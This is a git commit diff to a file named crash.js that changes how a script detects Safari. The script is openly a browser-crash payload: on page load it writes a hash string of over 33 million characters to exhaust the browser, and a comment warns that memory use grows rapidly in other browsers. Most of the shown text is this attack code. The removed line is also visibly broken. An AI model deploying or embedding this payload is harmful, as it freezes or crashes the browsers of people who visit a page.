e2de53669d0cf2ac4e51a3ea221c4554fa1e0a35
Dylan <149286876+FatalFit@users.noreply.github.com>
2024-02-15 16:30:04 -0500

    Simpler way of detecting browser

--- crash.js
+++ crash.js
@@ -1,5 +1,5 @@
 // warning: if not using safari the browser's memory usage will grow rapidly
-const isSafari = /^((?!chrome|android).)*safari/i.j(navigator.userAgent);
+var isSafari = navigator.userAgent.indexOf("Safari") > -1;
 if (isSafari) {
     window.onload = () => location.hash = "M" + "\u0001".repeat(2 ** 25) + "m";
 } else {
